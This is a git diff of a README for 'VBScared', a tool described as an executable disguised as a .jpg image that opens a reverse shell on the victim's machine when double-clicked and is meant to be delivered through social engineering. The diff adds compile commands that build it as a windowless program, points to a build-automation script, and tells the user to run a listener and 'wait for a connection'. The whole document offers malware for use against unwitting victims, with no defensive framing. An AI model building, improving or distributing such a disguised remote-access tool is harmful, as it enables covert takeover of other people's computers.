@@ -1,9 +1,11 @@
-# Scary VBS Stuff
+# VBScared Social Engineering Tool 💀
+
+VBScared is an executable, disguised as a .jpg file, that executes a reverse shell upon double clicking. The executable can be delivered to victims via social engineering tactics.
 
 ## Compile resources
 
 ```
-windres resources.rc -O coff -o resources.res
+windres resources\resources.rc -O coff --target pe-i386 -o resources\resources.res
 ```
 
 ## Compile executable
@@ -12,4 +14,10 @@ windres resources.rc -O coff -o resources.res
 cl runscript.c /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup
 ```
 
-Now all that's left is to change the name of the executable and wait for the bait
+## Automated build
+
+Or you can use the `generate.py` script under `scripts` to automate the build process
+
+## Run server.py
+
+Wait for a connection ;).
